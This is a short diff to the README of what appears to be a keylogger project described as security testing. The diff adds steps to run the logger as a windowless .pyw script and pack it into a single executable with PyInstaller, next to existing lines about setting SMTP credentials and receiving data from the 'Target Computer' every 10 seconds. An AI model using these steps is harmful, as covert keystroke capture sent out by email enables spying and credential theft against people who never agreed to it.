@@ -18,8 +18,10 @@ Purpose of the project is testing the security of information systems
 •**Set your own SMTP USERNAME and SMTP PASSWORD on "keylogger.py".**
 
 •**pip install -r requirements.txt**
+•**python3 keylogger.pyw**
+•**pip install pyinstaller**
+•**pyinstaller keylogger.pyw --onefile**
 
-•**python3 keylogger.py**
 
 •**Every 10 seconds,You Get the Data from the Target Computer**
 
